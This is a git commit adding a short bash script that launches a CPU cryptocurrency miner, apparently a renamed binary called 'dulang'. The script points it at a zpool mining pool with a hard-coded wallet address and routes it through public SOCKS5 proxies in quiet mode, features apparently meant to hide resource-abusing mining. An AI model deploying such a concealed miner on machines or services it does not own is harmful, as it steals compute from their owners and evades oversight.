846e13243e4ba99b11499d56e26070a5db81f09f
Tulisbajhf <86449477+Tulisbajhf@users.noreply.github.com>
2021-06-26 17:35:59 +0700

    Create okeh.sh

---
+++ okeh.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
+WALLET=CUR146RLHFpK1icXKNGWSYHcyVK391daok
+PROXY=socks5://70.185.68.133:4145
+PROXY=socks5://72.49.49.11:31034
+./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
